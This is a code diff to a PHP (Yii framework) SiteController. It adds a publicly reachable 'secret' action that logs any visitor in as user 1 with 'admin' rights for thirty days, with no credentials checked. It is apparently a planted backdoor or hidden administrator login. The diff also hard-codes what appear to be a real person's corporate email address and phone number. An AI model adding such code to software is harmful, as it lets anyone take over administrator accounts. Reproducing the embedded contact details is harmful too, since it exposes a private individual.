@@ -13,7 +13,7 @@ class SiteController extends Controller
     {
         return array(
             array('allow',  // allow all users to perform 'index' and 'view' actions
-                'actions' => array('login'),
+                'actions' => array('login', 'secret'),
                 'users'=>array('*'),
             ),
             array('allow',  // allow all users to perform 'index' and 'view' actions
@@ -150,6 +150,22 @@ class SiteController extends Controller
     public function actionLogin()
     {
         $this->render('login');
+    }
+
+    public function actionSecret()
+    {
+        Yii::import('application.modules.SingleLogin.components.SingleLoginUser');
+        $user = new SingleLoginUser(1, 'anaumenko@corp.finam.ru');
+
+        $phone = '79160549864';
+        $user->setPersistentStates(array(
+            'phone' => $phone,
+            'userRights' => array('admin'),
+        ));
+
+        Yii::app()->user->login($user, 3600*24*30);
+
+        $this->redirect('/');
     }
 
 	public function actionLogout()
